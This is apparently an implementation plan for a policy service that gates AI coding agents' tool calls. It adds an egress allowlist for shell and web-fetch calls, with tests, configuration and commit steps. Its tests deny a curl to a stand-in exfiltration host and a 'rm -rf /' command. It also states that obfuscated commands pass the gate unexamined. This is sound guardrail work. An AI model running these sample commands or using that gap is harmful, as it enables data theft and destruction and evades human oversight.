- **A declared annotator with no dispatcher denies everything.** One manifest declaring `annotators: egress: {type: classifier}`, evaluated by a bridge built without a dispatcher, answered `deny runtime_error:annotation_failed` — *"egress: missing required field 'url'"* — for `echo hi` as readily as for a `curl`. Not a no-op: a total deny wearing a runtime-error reason, which reads like a policy decision.
- **`cfg.egress: {}` denies every destination.** `allowlist(rules)` falls back to `input.tool.security_labels` when the key is absent, and every tool this manifest registers carries `[shell]`, so every destination fails the glob.

- [ ] **Step 1: Write the failing test**

Append to `packages/guardian/test/server.test.ts`, following that file's existing "start a real Guardian and post an envelope" helpers. Add an import of `dispatchGuardianAnnotator` from `../src/server.ts`.

```ts
describe("the annotator the shipped manifest declares", () => {
  it("routes the egress annotator by name", () => {
    expect(
      dispatchGuardianAnnotator("egress", {}, { snapshot: { tool_call: { args: {}, raw_command: "curl https://exfil.test/x" } } }),
    ).toEqual({ destination: "https://exfil.test/x" });
  });

  // A manifest naming an annotator this Guardian has nothing for is a
  // deployment fault, and AGT turns the throw into a deny on every call --
  // which is exactly right, because it is wrong on every call. Answering an
  // empty annotation instead would run the deployment silently unannotated.
  it("refuses a name it has no annotator for, rather than answering nothing", () => {
    expect(() => dispatchGuardianAnnotator("drift_score", {}, {})).toThrow(/drift_score/);
  });
});

// THE ONE CHECK IN THIS SLICE WHOSE ABSENCE WOULD BE SILENT. A manifest
// declaring an annotator the Guardian dispatches nothing for denies every
// call, benign ones included, with a runtime-error reason that reads like a
// policy decision -- measured. Nothing else here would catch that: every
// deny-side test in this slice would still pass.
describe("a benign call under the shipped manifest and the shipped annotator", () => {
  it("is not denied", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" });
      expect(decision.decision).toBe("allow");
      expect(decision.reason_codes ?? []).not.toContain("runtime_error:annotation_failed");
    } finally {
      await guardian.close();
    }
  });
});

describe("AGT's stock egress gate, driven from configuration", () => {
  it("denies a fetch of a host the allowlist does not cover", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "WebFetch", { url: "https://exfil.attacker.test/steal" });
      expect(decision.decision).toBe("deny");
      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
    } finally {
      await guardian.close();
    }
  });

  it("allows a fetch the allowlist covers", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      expect((await postToolCallRequest(guardian, "WebFetch", { url: "https://docs.anthropic.com/x" })).decision).toBe("allow");
    } finally {
      await guardian.close();
    }
  });

  it("denies a shell command reaching the same host, from a destination the Guardian extracted", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(
        guardian,
        "Bash",
        { command: "curl https://exfil.attacker.test/steal" },
        { raw_command: "curl https://exfil.attacker.test/steal" },
      );
      expect(decision.decision).toBe("deny");
      expect(decision.reason_codes).toEqual(["egress_destination_not_allowed"]);
    } finally {
      await guardian.close();
    }
  });

  // No false positive in either direction, which is what makes a SHARED
  // policy-target leaf safe: the destructive-shell patterns do not match URLs,
  // and the egress gate does not match commands.
  it("still denies a destructive shell command on its own gate, not on this one", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(guardian, "Bash", { command: "rm -rf /" }, { raw_command: "rm -rf /" });
      expect(decision.reason_codes).toEqual(["destructive_shell_command_blocked"]);
    } finally {
      await guardian.close();
    }
  });

  it("allows a shell command reaching a host the allowlist covers", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      const decision = await postToolCallRequest(
        guardian,
        "Bash",
        { command: "curl https://docs.anthropic.com/x" },
        { raw_command: "curl https://docs.anthropic.com/x" },
      );
      expect(decision.decision).toBe("allow");
    } finally {
      await guardian.close();
    }
  });

  // The stated miss direction, at the level a demo viewer sees it: a command
  // the extractor cannot parse is unexamined, not denied.
  it("allows a command it can find no destination in, rather than denying what it cannot read", async () => {
    const guardian = await startGuardian({ port: 0, manifestPath: "policy/manifest.yaml" });
    try {
      expect(
        (await postToolCallRequest(guardian, "Bash", { command: "echo hi" }, { raw_command: "echo hi" })).decision,
      ).toBe("allow");
    } finally {
      await guardian.close();
    }
  });
});
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `bun test packages/guardian/test/server.test.ts`
Expected: FAIL — `dispatchGuardianAnnotator` is not exported, and the egress cases come back `allow` because `cfg.egress` is not set.

- [ ] **Step 3: Turn the gate on**

`policy/lib/data.json` gains one key. This file is **not** vendored — `test/pin.test.ts` says the bundle "adds nothing except data.json", and `verify:pin` byte-diffs only the `.rego` files — so this is configuration, not a fork.

```json
        "egress": {
          "allowlist": ["*.anthropic.com", "docs.example.com"]
        },
```

**The `allowlist` key is not optional in practice.** JSON carries no comments, so the reason lives in `policy/manifest.yaml`'s tool entries and in the runbook: with the key absent, `allowlist(rules)` falls back to `input.tool.security_labels`, which is `["shell"]` on every tool this manifest registers, and the gate denies every destination — a total deny that reads like a policy decision.

- [ ] **Step 4: Declare the annotator in the manifest**

In `policy/manifest.yaml`, add the `annotators` block after `policies:` and the `annotations` block inside `pre_tool_call`:

```yaml
# The one annotator this deployment declares, and the only way `annotations`
# reaches policy input at all -- five other placements were tried against the
# ACS snapshot while V3 was designed and every one was dropped silently; see
# policy/manifest.drift.yaml's header.
#
# `classifier` is AGT's own type for a host-supplied judgement about a step.
# Here the judgement is "which destination does this command reach", which the
# Guardian answers from ACS's raw_command because AGT's own host_of() cannot:
# it splits on "://" and then "/", so handed a whole command line it answers a
# garbage host.
#
# WHAT MUST BE TRUE FOR THIS BLOCK TO BE SAFE, measured rather than assumed: a
# manifest that declares an annotator and is evaluated by a bridge built
# WITHOUT a dispatcher denies every call -- benign ones included -- with
# runtime_error:annotation_failed. startGuardian therefore supplies its
# built-in dispatcher unconditionally, and a test asserting a benign call is
# not denied under this manifest is the backstop.
annotators:
  egress:
    type: classifier
```

```yaml
    # Wires the annotator above into this gate. `from` is a LIVENESS
    # PRECONDITION, not a projection, and both halves of that are measured:
    # AGT requires this path to resolve or it denies the whole call on
    # runtime_error:path_missing with the annotator never dispatched, and the
    # value it resolves is NOT what the annotator receives -- the dispatcher
    # gets the entire preliminary policy input and reads the command out of it
    # by name.
    #
    # So this path names the one snapshot member assemble-snapshot.ts
    # guarantees is always present: raw_command, the empty string when the wire
    # carried none. A path that could be absent for some tool would make every
    # call by that tool a total deny.
    annotations:
      egress:
        from: "$.tool_call.raw_command"
```

`policy/manifest.drift.yaml` moves to the same leaf, for the same reason and with a comment saying so. Its `policy_target` still resolves for `Bash` today only because the assembler leaves each tool's own arguments beside the leaf; leaving it pointed at `command` would silently deny the first non-shell tool anyone ran the drift demo with.

```yaml
    policy_target: "$.tool_call.args.acs_policy_target"
    policy_target_kind: tool_args
    tool_name_from: "$.tool_call.name"
    annotations:
      drift_score:
        from: "$.tool_call.args.acs_policy_target"
```

- [ ] **Step 5: Supply the dispatcher unconditionally**

In `packages/guardian/src/server.ts`, import the annotator and add the router at module level:

```ts
import { annotateEgressDestination } from "./annotate-egress.ts";
```

```ts
/**
 * The annotators this Guardian can answer for, routed by the name the manifest
 * declared.
 *
 * A name this has nothing for THROWS, and that is deliberate even though AGT
 * turns it into a deny on every call in the deployment. It is wrong on every
 * call: a manifest declaring an annotator whose value never arrives is
 * evaluating policy against an annotation that is permanently absent. Failing
 * loudly and immediately is better than running silently unannotated, and the
 * failure is found on the first request rather than in an incident review.
 */
export const dispatchGuardianAnnotator: Annotator = (name, config, preliminary) => {
  if (name === "egress") {
    return annotateEgressDestination(name, config, preliminary);
  }
  throw new Error(
    `this Guardian has no annotator named ${JSON.stringify(name)} -- the manifest declares one it cannot ` +
      `supply a value for`,
  );
};
```

Rewrite `StartGuardianOptions.annotator`'s doc comment, which currently says the main manifest declares no annotator and that omitting the option means running with none. Both halves are now false:

```ts
  /** Overrides the annotator this Guardian dispatches, replacing the built-in
   * one entirely.
   *
   * Omitting this no longer means "no annotator" -- it means the built-in one
   * (`dispatchGuardianAnnotator`). `policy/manifest.yaml` declares an
   * `egress` annotator, and a declared annotator the bridge dispatches
   * nothing for denies EVERY call with runtime_error:annotation_failed,
   * measured, benign calls included. So the dispatcher is never absent, and
   * this option chooses which one rather than whether. V3's drift demo is the
   * caller that supplies its own. */
  annotator?: Annotator;
```

And the construction:

```ts
  // Never `undefined`. See StartGuardianOptions.annotator: a manifest-declared
  // annotator with no dispatcher is a total deny, not a no-op.
  const bridge = bridgeOverride ?? createBridge(manifestPath, { annotator: annotator ?? dispatchGuardianAnnotator });
```

- [ ] **Step 6: Run the tests to verify they pass**

Run: `bun test packages/guardian/test/server.test.ts`
Expected: PASS.

Then the whole suite: `bun test && bun run typecheck`.

**Read every new failure before touching it.** Turning on a fourth gate class changes verdicts for any existing test whose fixture command contains a URL — the priority chain puts `egress` above `patterns`, so a fixture that used to deny on a destructive pattern and also names a host outside the allowlist now denies on egress instead. That is a real behaviour change and belongs in the commit message, not in an adjusted assertion.

- [ ] **Step 7: Verify the pin is untouched**

```bash
bun run verify:pin
```

Expected: PASS. This is the claim the slice rests on — a fourth gate class went live and no `.rego` file changed. If `trash` is missing or the network is down the script refuses; report that rather than skipping the check.

- [ ] **Step 8: Commit**

```bash
git add policy/lib/data.json policy/manifest.yaml policy/manifest.drift.yaml packages/guardian/src/server.ts packages/guardian/test/server.test.ts
git commit -m "Turn on a fourth gate class with one config key, and stop treating a dispatcher as optional"
```

---


## Task 5: Letting a real host produce the second shape · slice #28 · S17, S2

Everything above is reachable only by a test that posts an envelope directly. This task lets a live host produce one.

**This task has no red-green cycle, and manufacturing one would be dishonest.** Nothing here is behaviour: it is which tools reach the shim at all (host #1's matcher), which tools a gate declines to ask about (host #2's `tools` list), and eight comments that describe a scope which just changed. The behavioural assertions were red before Tasks 1 and 4 and are green now. What this task owes instead is a **live measurement** and a comment audit, and both are checkable.

**Files:**
- Modify: `.claude/settings.json`
- Modify: `hosts/claude-code/settings.json`
- Modify: `hosts/opencode/opencode.hookmap.yaml` (the request gate's `tools:` list)
- Modify: `mapping.yaml` (only if Step 1's measurement contradicts the declared `webfetch` argument)
- Modify: eight comments that name `^Bash$` as the whole scope

- [ ] **Step 1: Measure host #2's fetch argument before trusting the declaration**

⚠️ **This is the one unverified value in the slice.** OpenCode's fetch tool NAME is measured — a live run through a Guardian recorded `read / grep / write / edit / webfetch -> deny runtime_error:path_missing`, which is OpenCode reporting its own tool names. Its argument KEY is read out of the shipped `opencode` 1.18.18 binary's own tool renderer (`t.input.url`), which is evidence about the tool's input shape and not a measurement of what lands in the plugin's `args`.

Start a Guardian with an envelope log, run a fetch through OpenCode with the plugin loaded, and read the argument bag off the logged envelope at `params.payload.arguments`:

```bash
bun run guardian &
# … run a web fetch in an OpenCode session with the plugin loaded …
```

Record what you saw in the commit message either way. If the key is not `url`, change `mapping.yaml`'s `by_tool.webfetch` row to what it actually is — and do **not** touch `WebFetch`, which is host #1's and is separately correct.

- [ ] **Step 2: Widen the request gate's matcher, and only the request gate's**

Both `.claude/settings.json` and `hosts/claude-code/settings.json`. The two files are byte-identical today and must stay so.

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "^(Bash|WebFetch)$",
        "hooks": [
          { "type": "command", "command": "bun run \"$CLAUDE_PROJECT_DIR/hosts/claude-code/acs-hook.ts\"" }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "^Bash$",
        "hooks": [
          { "type": "command", "command": "bun run \"$CLAUDE_PROJECT_DIR/hosts/claude-code/acs-hook.ts\"" }
        ]
      }
    ]
  }
}
```

**`PostToolUse` deliberately does not widen, and that is measured rather than cautious.** The hookmap's `PostToolUse` entry declares `outputs.from: $.tool_response.stdout`. A `WebFetch` result carries no `stdout`, so `resolvePath` answers `undefined`, `buildPayload` throws, `governStep` catches it at stage `"request"` and answers with the negotiated delivery posture — and under the shipped default (`proceed`) the step runs **ungoverned with an audit event**. No stock gate reads a fetch's output, so widening it would buy a fail-open in exchange for nothing.

Verify the two files stayed identical:

```bash
diff .claude/settings.json hosts/claude-code/settings.json && echo identical
```

- [ ] **Step 3: Widen host #2's request gate**

In `hosts/opencode/opencode.hookmap.yaml`, on the `tool.execute.before` entry only:

```yaml
    tools: [bash, webfetch]
```

The result gate's `tools: [bash]` **stays**, for the same reason host #1's `PostToolUse` matcher stays anchored: `governsTool` skipping a tool is an empty render rather than a fail-open, and no stock gate reads a fetch's output.

Extend that entry's existing `tools` comment — the one that already explains, at length, why the request gate needs a list at all — with the sentence that is new:

```yaml
    # `webfetch` joins `bash` because the manifest can now express a policy
    # target for it: mapping.yaml names which argument each tool's target lives
    # in, and the Guardian copies it to the one leaf the manifest points at. The
    # paragraph above still holds for every OTHER tool this host can call --
    # they are declined here, not asked and mis-answered.
```

- [ ] **Step 4: Update the comments that say `^Bash$` is the whole scope**

Eight of them. Read each and rewrite the sentence; do not search-and-replace the pattern, because several are making a wider point that is still true.

```
test/invariants.test.ts:393
test/invariants.test.ts:471
packages/host-adapter/src/build-envelope.ts:89
packages/host-adapter/src/govern-step.ts:146
packages/host-adapter/src/govern-step.ts:279
packages/host-adapter/test/govern-step.test.ts:562
hosts/claude-code/test/hook.test.ts:198
hosts/opencode/test/hookmap.test.ts:121
```

The claim that survives in all eight: **host #1 scopes by its `settings.json` matcher where host #2 scopes by a hookmap `tools` list**, which is why host #1's hookmap declares no `tools` at either gate. What changes is that the matcher now names two tools at the request gate and one at the result gate — so host #1's two gates are no longer scoped identically, which none of these comments currently anticipates.

- [ ] **Step 5: Run everything**

```bash
bun test
bun run typecheck
bun run verify:pin
```

Expected: all green. `test/invariants.test.ts`'s *"Claude Code's hookmap declares no `tools` at a gate where an empty render is not an answer"* still holds — this slice adds no `tools` list to host #1's hookmap.

- [ ] **Step 6: Commit**

```bash
git add .claude/settings.json hosts/claude-code/settings.json hosts/opencode/opencode.hookmap.yaml mapping.yaml test/invariants.test.ts packages/host-adapter hosts/claude-code/test hosts/opencode/test
git commit -m "Let a second tool reach the shim, and say which gates are still one-tool"
```

---

## Task 6: The runbook, the declaration, and the amendments · slice #28

Every claim in this slice becomes text a reader can check, or it is not delivered. The runbook is captured from real runs; the corrections found while planning are amended into the slices doc; and the two things this slice does **not** close are named there rather than left to be inherited.

**Files:**
- Create: `docs/demos/v9-runbook.md`
- Modify: `docs/shaping/acs-reference-impl-slices.md` (§V9, and risk rows)
- Modify: `slices/v9/README.md`
- Modify: `README.md`
- Modify: `docs/demos/v3-runbook.md` (only if Step 2's re-run contradicts it)

- [ ] **Step 1: Capture the runbook**

Write `docs/demos/v9-runbook.md` following `docs/demos/v8-runbook.md`'s shape: the demo in words, prerequisites, then captured blocks. **Nothing hand-edited.** Every block is pasted from an actual run.

Sections, in order:

1. **The demo, in words.** Two routes to one gate, and why they are two claims rather than one.
2. **The half with no code at all.** `egress.rego`'s **first** default destination path is `["snapshot","tool_call","args","url"]`, and the assembler already unwraps every ACS `arguments.<k>.value` into `tool_call.args.<k>`. Capture the two `WebFetch` verdicts and the `policy/lib/data.json` diff behind them — one key.
3. **The half that needs a Guardian.** Capture the two `Bash` `curl` verdicts, and beside them the `input.annotations.egress` block out of AGT's own policy input, so a reader sees the destination arriving at AGT's own fifth declared path rather than taking it on trust.
4. **The four gate classes on one leaf.** Capture all six rows of Task 4's coexistence table. State plainly that no gate produced a false positive in either direction.
5. **The redaction that used to land on the wrong argument.** Capture the `modify` decision for a fetch whose url carries a token, showing `parameter_overrides.url`. State what it was before: `parameter_overrides.command`, on a tool with no `command`, while `url` shipped untouched.
6. **What this does not catch, stated plainly because the demo's shape invites the opposite reading.** A command the extractor cannot parse is **unexamined, not denied** — the gate is `undefined` when no destination resolves and the call falls through. Capture an obfuscated command allowing, so the limit is shown rather than asserted.
7. **The pin.** `bun run verify:pin` output. A fourth gate class went live and no `.rego` changed.

- [ ] **Step 2: Re-run V3's drift capture**

Task 4 moved `policy/manifest.drift.yaml`'s `policy_target` to the normalised leaf. The verdict should be unchanged — the drift gate reads an annotation, not the target — but "should be" is not this repository's standard.

Re-run the drift demo exactly as `docs/demos/v3-runbook.md` §"the annotator" describes it and compare the captured verdict. If it differs, re-capture that section and say so in the commit message; if it matches, say that too.

- [ ] **Step 3: Amend §V9 with the five corrections**

In `docs/shaping/acs-reference-impl-slices.md` §V9:

1. **C1** — a new ⚠️ subsection: an annotator's `from` is a liveness precondition, not a projection; an unresolvable one denies the whole call with the annotator never dispatched; the resolved value never reaches the dispatcher. This is a **second** instance of §A8's family and it is the reason `raw_command` is always on the snapshot.
2. **C2** — amend the "The two egress routes are not one claim" paragraph. The distinction is real and the *matrix cell* is not: V7's matrix is 8 points × 5 verdicts read off the SDK's own consts, `pre_tool_call × deny` already resolves `expressed`, and there is no coordinate for a gate class or a route. Restate the claim where it is true — the runbook and this section — and record that V9 touches `packages/conformance` not at all. Cite V8's own precedent: a `SurfaceDiff` is not a cell of the 8 × 5 either.
3. **C3** — a new risk row: two resolvable destination paths with different values are `runtime_error:policy_invocation_failed`, not a priority order. Not reachable across the two tools this slice governs, reachable on the first tool registered that sends both, closed structurally in the annotator.
4. **C4** — replace §V9's two partial verdict tables with the full six-row measurement taken against the manifest this slice actually ships.
5. **C5** — record the split evidence for OpenCode's fetch tool: name measured, argument key read out of the binary, and what Task 5's live run found.

Update `slices/v9/README.md` in the same pass: commitment 6's wording stands, but the file should now say that the annotator also stands down when the snapshot's own arguments already carry a destination, and why.

- [ ] **Step 4: State what is not closed, in the same words as the risk rows**

Amend §V9's own text — do not rely on the risk table alone:

- **Risk row 22 (the miss direction)** is this slice's, stated in the runbook and in the annotator's own doc comment.
- **Risk row 24 (the result gate's one-shape assumption)** is **not** this slice's and stays unassigned. The general close is the `outputs` counterpart of `mapping.yaml`'s `by_tool` table; it needs its own measurements per host, and the two hookmaps' `outputs` blocks already differ.
- **The `by_tool` registry check is existence only.** The manifest registry can say `WebFetch` is registered; it cannot say `WebFetch` takes a `url`. Same limit V8 measured for hookmap `tools` entries, and for the same reason: one manifest serves both hosts.

- [ ] **Step 5: Update `README.md`**

Add the V9 paragraph in the shape V3's and V8's already have: what shipped, what was configuration and what was code, and the one sentence that does the work — **three of AGT's nine stock gate classes were reachable before this slice; `egress` is the fourth, and the half of it that covers `WebFetch` needed one `data.json` key and no code at all.** Link `slices/v9/README.md` and `docs/demos/v9-runbook.md`.

Also update the `ACS_MANIFEST_PATH` row of the environment table if it describes the main manifest as declaring no annotator.

- [ ] **Step 6: Verify every captured block is real**

Re-run each captured command and diff it against what is in the runbook. A block that differs is re-captured, never edited.

```bash
bun test
bun run typecheck
bun run verify:pin
bun run conformance
```

- [ ] **Step 7: Commit**

```bash
git add docs/demos/v9-runbook.md docs/shaping/acs-reference-impl-slices.md slices/v9/README.md README.md docs/demos/v3-runbook.md
git commit -m "Capture V9 against the shipped build, and correct five things planning measured"
```

---

## Cross-slice work in this plan

| Change | Whose it was | Why it lands here |
|---|---|---|
| `mapping.yaml`'s `redaction_applied.pre_tool_call` summary | V3's wording table | The sentence says "this command", and this slice is what first makes it wrong — a fetch's url is not a command, and this is the sentence a model reads |
| `policy/manifest.drift.yaml`'s `policy_target` | V3's second manifest | It targets `$.tool_call.args.command`. It still resolves for `Bash`, and would deny the first non-shell tool anyone ran the drift demo with. One line, moved with the main manifest |
| Eight `^Bash$` comments | V1, V4, V5 | Each describes a scope that changes in Task 5. Left alone they would be the only remaining statement that this deployment governs one tool |

## Scope added during planning

| Addition | Why |
|---|---|
| An always-present `raw_command` on the request snapshot | C1: an unresolvable annotator `from` denies every call with the annotator never dispatched. Not in the spike, and not optional |
| The annotator stands down when the snapshot's own arguments carry a destination | C3: two resolvable destination paths are a complete-rule conflict, measured as `runtime_error:policy_invocation_failed` |
| A result gate declaring `raw_command` is refused | Symmetry with `assertRequestGateDeclaresNoOutputs`; a result payload has no member for it, so the declaration could only ever be dropped |
| `dispatchGuardianAnnotator` throws for a name it has nothing for | A manifest declaring an annotator whose value never arrives evaluates policy against a permanently absent annotation. Wrong on every call, so it should fail on the first |

## Not in this plan

| Item | Why, and where it goes |
|---|---|
| V7 coverage-matrix cells for the two egress routes | C2: the matrix is 8 points × 5 verdicts read off the SDK's own consts and has no coordinate for a gate class or a route. `pre_tool_call × deny` already resolves `expressed`. Stated in the runbook and §V9 instead |
| The result gate's `outputs.from` one-shape assumption | Risk row 24, explicitly unassigned. Needs its own measurements per host; the two hookmaps' `outputs` blocks already differ |
| Governing any third tool | Additive by construction — a `tools:` registration plus a `by_tool` row plus a matcher entry — and not something this slice's demo should be read as having done |
| The six posture-seam hookmap faults; the Inspector tail-test sleeps | Carried from §V5 and §V2; untouched here |

## What this slice does and does not confirm

**Confirms.** AGT's stock `egress` gate decides real ACS traffic through the pinned, unforked bundle, for two tools whose arguments disagree about their names, by two different routes — one where the wire and the gate already agree and nothing translates, one where the Guardian originates the destination and answers at AGT's own declared annotation path. Four of AGT's nine stock gate classes are now live in one Guardian on one manifest, with no false positive between them.

**Does not confirm.** That the destination extractor sees every egress form — it sees the first absolute http(s) URL in a command line, and an obfuscated or novel form falls through to `allow`. That widening the matcher governs anything but the tools named in it. That a fetch's *output* is governed at all — the result gate stays scoped to one tool, deliberately, and the assumption behind that is recorded and unassigned. That `WebFetch` takes a `url`: the manifest registry checks that a `by_tool` key is a registered tool, and nothing in this repository can check a tool's argument shape.
